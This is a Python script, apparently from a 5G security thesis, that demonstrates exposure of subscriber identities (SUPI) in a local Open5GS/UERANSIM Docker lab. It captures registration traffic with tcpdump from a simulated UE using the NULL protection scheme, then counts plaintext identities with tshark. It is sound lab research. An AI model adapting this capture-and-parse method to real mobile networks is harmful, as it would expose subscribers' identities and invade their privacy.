#!/usr/bin/env python3
"""
SUPI Harvesting Attack - FGT5019
Thesis: On Enhancing 5G Security
Method: protectionScheme=0 (NULL scheme) — SUPI sent in plaintext
"""

import subprocess
import time

CAPTURE_FILE = "/home/eit42s/thesis-5g/captures/supi_harvest.pcap"
LOG_FILE     = "/home/eit42s/thesis-5g/logs/supi_harvest.log"

def log(msg):
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def main():
    log("=" * 60)
    log("SUPI HARVESTING ATTACK - FGT5019")
    log("Target: UE Identity Privacy (SUCI Protection)")
    log("Method: protectionScheme=0 (NULL scheme)")
    log("=" * 60)

    # PHASE 1: Start capture inside AMF
    log("\n[PHASE 1] Starting capture...")
    subprocess.run("docker exec open5gs-amf rm -f /tmp/supi_harvest.pcap", shell=True)
    tcpdump = subprocess.Popen(
        "docker exec open5gs-amf tcpdump -i any -w /tmp/supi_harvest.pcap",
        shell=True
    )
    time.sleep(3)
    log("[*] Capture started.")

    # PHASE 2: Start UE with NULL scheme
    log("\n[PHASE 2] Starting UE with NULL protection scheme...")
    
    # Ensure no old container
    subprocess.run("docker rm -f ueransim-ue-supi 2>/dev/null", shell=True)
    
    cid = subprocess.run(
        """docker run -d \
            --name ueransim-ue-supi \
            --network thesis-5g_5gcore \
            --ip 10.10.0.41 \
            --privileged \
            -v /home/eit42s/thesis-5g/config/ue-supi.yaml:/etc/ueransim/ue.yaml \
            ueransim-custom:3.2.7 ue /etc/ueransim/ue.yaml""",
        shell=True, capture_output=True, text=True
    ).stdout.strip()

    time.sleep(20)

    # Check logs
    logs = subprocess.run(
        "docker logs ueransim-ue-supi 2>&1",
        shell=True, capture_output=True, text=True
    ).stdout
    log(f"[*] UE logs:\n{logs[-500:]}")

    # PHASE 3: Stop capture
    log("\n[PHASE 3] Stopping capture...")
    subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
    time.sleep(2)
    subprocess.run(f"docker cp open5gs-amf:/tmp/supi_harvest.pcap {CAPTURE_FILE}", shell=True)

    # Stop UE
    subprocess.run("docker rm -f ueransim-ue-supi 2>/dev/null", shell=True)

    # PHASE 4: Analyze
    log("\n[PHASE 4] Analyzing SUPI exposure...")
    result = subprocess.run(
        f"tshark -r {CAPTURE_FILE} -d 'sctp.port==38412,ngap' -V 2>/dev/null | grep -i 'Protection scheme'",
        shell=True, capture_output=True, text=True
    ).stdout

    null_count = result.lower().count("null scheme")
    log(f"[*] NULL scheme detected: {null_count} times")
    log(f"[*] Evidence:\n{result[:500]}")

    with open(LOG_FILE, 'w') as f:
        f.write(result)

    log("\n" + "=" * 60)
    log("SUPI HARVESTING RESULTS")
    log(f"NULL scheme (0) detected: {null_count} times")
    log("SUPI transmitted in plaintext!" if null_count > 0 else "No NULL scheme detected")
    log("=" * 60)
    log(f"[*] Log:     {LOG_FILE}")
    log(f"[*] Capture: {CAPTURE_FILE}")

if __name__ == "__main__":
    main()
